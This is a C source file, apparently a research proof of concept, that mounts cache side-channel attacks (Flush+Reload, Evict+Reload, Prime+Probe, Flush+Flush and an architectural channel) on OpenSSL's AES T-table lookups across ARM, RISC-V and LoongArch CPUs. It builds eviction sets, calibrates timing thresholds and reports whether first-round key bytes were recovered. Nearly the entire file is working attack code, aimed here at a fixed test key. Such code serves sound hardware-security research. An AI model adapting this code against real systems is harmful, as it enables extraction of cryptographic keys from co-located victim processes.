#include <math.h>
#define _GNU_SOURCE
#include <fcntl.h>
#include <openssl/aes.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#include <time.h>

#define FLUSHRELOAD 0
#define EVICTRELOAD 1
#define PRIMEPROBE  2
#define FLUSHFLUSH  3
#define ARCHSC      4

// more encryptions show features more clearly
/* #define NUMBER_OF_ENCRYPTIONS_VISUAL 50 */
/* #define NUMBER_OF_MEASUREMENTS         1 */

// lab39 A76 ARCH SC
/* #define ATTACK ARCHSC */
/* #define NUMBER_OF_ENCRYPTIONS_VISUAL  50 */
/* #define NUMBER_OF_MEASUREMENTS        1 */

// lab39 A76 F+R
/* #define ATTACK FLUSHRELOAD */
/* #define NUMBER_OF_ENCRYPTIONS_VISUAL 500 */
/* #define NUMBER_OF_MEASUREMENTS        10 */

#if defined(__aarch64__)
// Used for measurements on A76
/* #define NUMBER_OF_ENCRYPTIONS_VISUAL  100 */
/* #define NUMBER_OF_MEASUREMENTS        3 */
// Used for measurements on Oryon
// eval
/* #define NUMBER_OF_ENCRYPTIONS_VISUAL  2000 */
// plot
#define NUMBER_OF_ENCRYPTIONS_VISUAL  3000
#define NUMBER_OF_MEASUREMENTS        3
#elif defined(__riscv)
// Used for measurements on C910
#define NUMBER_OF_ENCRYPTIONS_VISUAL  2000
#define NUMBER_OF_MEASUREMENTS        3
// C910 plot
/* #define NUMBER_OF_ENCRYPTIONS_VISUAL  300 */
/* #define NUMBER_OF_MEASUREMENTS        3 */
#elif defined(__loongarch64)
// same for plot
#define NUMBER_OF_ENCRYPTIONS_VISUAL  100
#define NUMBER_OF_MEASUREMENTS        3
#else
#error "unsupported arch"
#endif

#if defined(__aarch64__)
/* #include "../libs/aarch64/lib_arch_sc_aarch64.h" */
#include "../libs/aarch64/oryon/lib_arch_sc_aarch64_oryon.h"
#elif defined(__riscv)
#include "../libs/riscv64/lib_arch_sc_riscv64.h"
#elif defined(__loongarch64)
#include "../libs/loongarch64/lib_arch_sc_loongarch64.h"
#else
#error "unsupported arch"
#endif

#define EV_BUFFER (1024 * 1024 * 1024)

unsigned char key[] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
};


char* eviction;

int get_set(size_t paddr) {
    return (paddr >> 6) & 2047;
}

void evict(size_t* set, int len) {
    mfence();
    for(size_t i = 1; i < len - 2; i ++) {
        maccess((void*)set[i]);
        maccess((void*)set[i + 1]);
        maccess((void*)set[i]);
        maccess((void*)set[i + 1]);
        maccess((void*)set[i]);
        maccess((void*)set[i + 1]);
        maccess((void*)set[i]);
        maccess((void*)set[i + 1]);
        maccess((void*)set[i]);
        maccess((void*)set[i + 1]);
   }
   mfence();
}




void build_eviction_set(size_t* evset, int len, size_t phys_target) {
  int target_set = get_set(phys_target);
  int target_slice = 0; //compute_slice(phys_target);
  int evcnt = 0;
  size_t candidate = (size_t)eviction + ((target_set << 6) % 4096) + 4096 * 8;
  while(evcnt < len && candidate < (size_t)eviction + EV_BUFFER) {
      size_t p = get_physical_address(candidate);
      if(get_set(p) == target_set /*&& compute_slice(p) == target_slice*/) {
          evset[evcnt++] = candidate;
      }
      candidate += 4096;
  }
  if(evcnt < len) {
    printf("Failed to build eviction set\n");
    exit(-1);
  }
//   printf("Found %d addresses for the eviction set\n", evcnt);
}

int WAYS;

AES_KEY key_struct;

char *base;
char *probe;
char *end;

extern const uint32_t Te0_real[512];

int cpu = -1;
void simple_first_round_attack(size_t offset) {
  unsigned char plaintext[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
  unsigned char ciphertext[128];
  srand(0);
  size_t sum = 0;
  size_t timings[16][16];
  memset(timings, 0, sizeof(timings));
  size_t min = -1ull, max = 0;
  
#if ATTACK == PRIMEPROBE || ATTACK == EVICTRELOAD
  size_t evset[16][64];
  for(int i = 0; i < 16; i++) {
    printf("Building eviction set %d/16\n", i + 1);
    build_eviction_set(evset[i], WAYS + 4, get_physical_address(base + offset + 64 * i));
  }
#endif
  
  size_t start_time = rdtsc();
  struct timespec t1;
  clock_gettime(CLOCK_MONOTONIC, &t1);
  uint64_t start_time_wall = t1.tv_sec * 1000 * 1000 * 1000ULL + t1.tv_nsec;
  for (size_t byte = 0; byte < 256; byte += 16) {
    plaintext[0] = byte;

    AES_encrypt(plaintext, ciphertext, &key_struct);

    int addr = 0;
    for (probe = base + offset; probe < base + offset + 0x400;
         probe += 64)
    {
      size_t count = 0;
      for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS_VISUAL; ++i) {
        for (size_t j = 1; j < 16; ++j) {
          plaintext[j] = rand() % 256;
        }

        size_t min_delta = -1ull, max_delta = 0;
        for(int r = 0; r < NUMBER_OF_MEASUREMENTS; r++) {
#if ATTACK == FLUSHRELOAD || ATTACK == ARCHSC
          flush(probe);
#elif ATTACK == EVICTRELOAD || ATTACK == PRIMEPROBE
          evict(evset[addr], WAYS);
#endif
          for(int ar = 0; ar < 2; ar++) AES_encrypt(plaintext, ciphertext, &key_struct);

#if ATTACK == ARCHSC
          size_t delta = !measure_arch_sc(probe);
#else

          size_t start = rdtsc();
#if ATTACK == FLUSHRELOAD || ATTACK == EVICTRELOAD
          maccess(probe);
#elif ATTACK == PRIMEPROBE
          evict(evset[addr], WAYS);
#elif ATTACK == FLUSHFLUSH
          flush(probe);
#endif

          size_t delta = rdtsc() - start;
          /* delta = delta >= CACHE_MISS; */
#endif
          if(delta < min_delta) min_delta = delta;
          if(delta > max_delta) max_delta = delta;
        }
        // printf("%zd\n", min_delta);
#if ATTACK == PRIMEPROBE
        // min_delta = min_delta < CACHE_MISS ? 1 : 0;
        // min_delta = max_delta / WAYS;
#endif
//	min_delta = min_delta < CACHE_MISS ? 1 : 0;
        count += min_delta;
      }
      timings[addr++][byte / 16] = count;
      if(count < min) min = count;
      if(count > max) max = count;
      sum += count;
      sched_yield();
    }
  }

  // find global min/max for normalization
  size_t gmin = -1ull, gmax = 0;
  for(int y = 0; y < 16; y++) {
    for(int x = 0; x < 16; x++) {
      if(timings[y][x] < gmin) gmin = timings[y][x];
      if(timings[y][x] > gmax) gmax = timings[y][x];
    }
  }


  char filename[128];
  snprintf(filename, sizeof(filename), "aes_t_table_hist_%d.csv", cpu);
  printf("Writing to %s\n", filename);
  FILE* f = fopen(filename, "w");
  int correct_max = 0, correct_min = 0;
  for(int y = 0; y < 16; y++) {
    size_t row_max = 0, row_min = -1ull;
    for(int x = 0; x < 16; x++) {
      if(timings[y][x] < row_min) row_min = timings[y][x];
      if(timings[y][x] > row_max) row_max = timings[y][x];
    }
    for(int x = 0; x < 16; x++) {
      size_t t = timings[y][x];
      printf("\x1b[4%dm%6zu  \x1b[0m", t == row_max ? 1 : t == row_min ? 2 : 0, t);

      // normalize+invert here
      int n = (gmax == gmin) ? 0 : 100 - (int)llround((double)(t - gmin) * 100.0 / (double)(gmax - gmin));
      fprintf(f, "%3d%s", n, x != 15 ? "," : "");

      if(x == y) {
        if(t == row_max) correct_max++;
        if(t == row_min) correct_min++;
      }
    }
    fprintf(f, "\n");
    printf("\n");
  }
  size_t total_time = rdtsc() - start_time;
  clock_gettime(CLOCK_MONOTONIC, &t1);
  size_t time_wall = (t1.tv_sec * 1000 * 1000 * 1000ULL + t1.tv_nsec) - start_time_wall;

  fclose(f);
  if(correct_max == 16 || correct_min == 16) {
    printf("\n\x1b[32mCORRECT!\x1b[0m\n");
  } else {
    printf("\n\x1b[31mFAILURE!\x1b[0m\n");
  }
  printf("Time: %zd ms (%zd cycles)\n", time_wall / 1000000, total_time);
}

char __attribute__((aligned(4096))) evtest[4096];

int main(int argc, char** argv) {
  if (argc > 1) {
    cpu = atoi(argv[1]);
  }
  init_arch_sc(&cpu);

  eviction = malloc(EV_BUFFER);
  memset(eviction, 1, EV_BUFFER);
  madvise(eviction, sizeof(eviction), MADV_HUGEPAGE);

  CACHE_MISS = detect_flush_reload_threshold();
  printf("Cache miss: %zd\n", CACHE_MISS);

  base = (char*)Te0_real;

  // Test if side channel works...
#if ATTACK == ARCHSC
  /* flush(base); */
  /* assert(MEASURE(base) == 0); */
  /* assert(MEASURE(base) == 1); */
  /* maccess(base); */
  /* assert(MEASURE(base) == 1); */
  /* assert(MEASURE(base) == 1); */
  /* maccess(base); */
  /* assert(MEASURE(base) == 1); */
  /* flush(base); */
  /* assert(MEASURE(base) == 0); */

  int a = 0;
  int b = 0;
  int n = 10000;
  for (int i = 0; i < 2*n; i++) {
      maccess(base);
      int select = rand() % 2;
      /* asm volatile("fence\nfence.i\n"); */
      mfence();
      nospec();
      if (select) {
          mfence();
          nospec();
          flush(base);
      }
      /* asm volatile("fence\nfence.i\n"); */
      if (select) {
          mfence();
          nospec();
          a += measure_arch_sc(base);
      } else {
          mfence();
          nospec();
          b += measure_arch_sc(base);
      }
  }
  printf("should be low: %6.2f\n", (float)a * 100 / n);
  if ((float)a * 100 / n > 5) {
      exit(42);
  }
  printf("should be high: %6.2f\n", (float)b * 100 / n);
  if ((float)b * 100 / n < 95) {
      exit(42);
  }


    a = 0;
    b = 0;
    for (int i=0; i<2*n; i++) {
    int choice = random() % 2;
    if (choice) {
        flush(base);
    } else {
        maccess(base);
    }
    if (choice) {
        a += measure_arch_sc(base);
    } else {
        b += measure_arch_sc(base);
    }
    }
    printf("should be low:  %6.2f\n", (float)a * 100 / n);
  if ((float)a * 100 / n > 5) {
      exit(42);
  }
    printf("should be high: %6.2f\n", (float)b * 100 / n);
  if ((float)b * 100 / n < 95) {
      exit(42);
  }
    printf("---------------\n");
#endif

  AES_set_encrypt_key(key, 128, &key_struct);

#if ATTACK == PRIMEPROBE || ATTACK == EVICTRELOAD
  memset(evtest, 2, sizeof(evtest));
  char set[64];
  build_eviction_set(set, 64, get_physical_address(evtest));

  size_t maxdiff = 0, maxdiff_i = 0, maxdiff_t = 0;
  for(int i = 8; i < 24; i++) {
      size_t t1, t2, start;
      sched_yield();

      mfence();
      evict(set, i + 1);
      mfence();
      maccess(evtest);
      mfence();
      start = rdtsc();
      evict(set, i);
      t1 = rdtsc() - start;

      sched_yield();

      mfence();
      evict(set, i);
      mfence();
      start = rdtsc();
      evict(set, i);
      t2 = rdtsc() - start;

      printf("%2d: %zd - %zd\n", i, t1, t2);
      if(t1 > t2 && (t1 - t2) > maxdiff) {
        maxdiff = t1 - t2;
        maxdiff_i = i;
        maxdiff_t = (t2 * 2 + t1) / 2;
      }
  }
  CACHE_MISS = maxdiff_t;
  WAYS = maxdiff_i;
  printf("Ways: %d, Threshold: %zd\n", WAYS, CACHE_MISS);
#endif
#if ATTACK == EVICTRELOAD
  WAYS++;
  WAYS = 18;
#endif
  simple_first_round_attack(0);

  fflush(stdout);
  return 0;
}
